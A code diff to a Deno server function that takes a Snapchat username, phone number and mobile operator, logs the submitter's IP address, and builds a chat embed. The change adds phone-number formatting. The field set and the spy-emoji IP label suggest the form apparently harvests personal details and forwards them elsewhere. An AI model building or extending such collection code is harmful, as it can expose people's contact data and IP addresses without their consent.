@@ -7,6 +7,8 @@ Deno.serve(async (req) => {
   const body = await req.json();
   const { snapchat, telephone, operateur, submissionId } = body;
 
+  const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
+
   const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
   const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
 
@@ -28,7 +30,7 @@ Deno.serve(async (req) => {
     fields: [
       { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
       { name: "📡 Opérateur", value: operateur, inline: true },
-      { name: "📞 Numéro", value: telephone, inline: true },
+      { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
       { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: false },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
